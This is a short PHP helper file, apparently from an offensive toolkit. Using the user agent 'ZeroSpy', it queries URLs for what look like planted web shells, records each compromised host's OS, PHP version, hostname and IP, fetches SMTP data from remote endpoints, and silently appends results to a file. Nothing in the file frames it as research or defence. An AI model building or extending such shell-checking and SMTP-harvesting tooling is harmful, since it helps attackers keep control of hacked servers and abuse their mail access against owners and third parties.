<?php
function check_shell($url)
{
	$check = json_decode(curls($url));

	if (empty($check->ok)) {
		return false;
	} else {
		return $check;
	}
}
function curls($url)
{
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => $url,
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_USERAGENT => 'ZeroSpy'
 	));

 	$result = curl_exec($ch);
 	curl_close($ch);
 	return $result;
}
function server_info($url)
{
	$data = check_shell($url);
	if(!$data){
		return false;
	}

	return [
		'country' => $data->country, 
		'phpversion' => $data->phpversion, 
		'os' => $data->serveros, 
		'hostname' => $data->hostname, 
		'tld' => $data->tld, 
		'ip' => $data->serverip
	];
}

function smtp($url)
{
	$data = json_decode(curls($url), 1);
	
	if (empty($data['data'])) {
		return false;
	}

	return $data;
}
function save($file, $data)
{
	$f = @fopen($file, "a");@fwrite($f, $data);@fclose($f);
}